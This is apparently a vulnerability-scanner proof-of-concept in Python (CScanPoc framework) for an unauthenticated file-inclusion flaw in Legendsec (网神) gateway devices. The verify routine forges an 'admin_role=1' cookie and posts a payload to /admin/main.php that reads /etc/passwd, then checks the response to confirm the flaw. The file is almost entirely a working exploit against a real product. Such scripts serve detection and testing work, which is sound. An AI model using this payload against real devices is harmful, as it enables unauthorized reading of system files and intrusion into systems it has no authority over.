# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Legendsec_0000'  # 平台漏洞编号
    name = '网神网关设备文件包含漏洞（无需登录可远程）'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2016-04-11'  # 漏洞公布时间
    desc = '''
        网神网关设备文件包含漏洞（无需登录可远程）。
    '''  # 漏洞描述
    ref = ''  # https://wooyun.shuimugan.com/bug/view?bug_no=169734
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网神'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '52002ceb-32d0-4791-86f8-e9bab3a3b48c'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/admin/main.php?skip=1'
            headers = {
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; CIBA; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
                'Cookie': 'admin_role=1',
                'Upgrade-Insecure-Requests': '1',
                'Accept-Encoding': 'gzip, deflate, sdch',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = 'body=test&BODY[test][role]=1&BODY[test][file]=/etc/passwd'
            response = requests.post(
                vul_url, data=data, headers=headers).text
            if 'daemon:/sbin' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
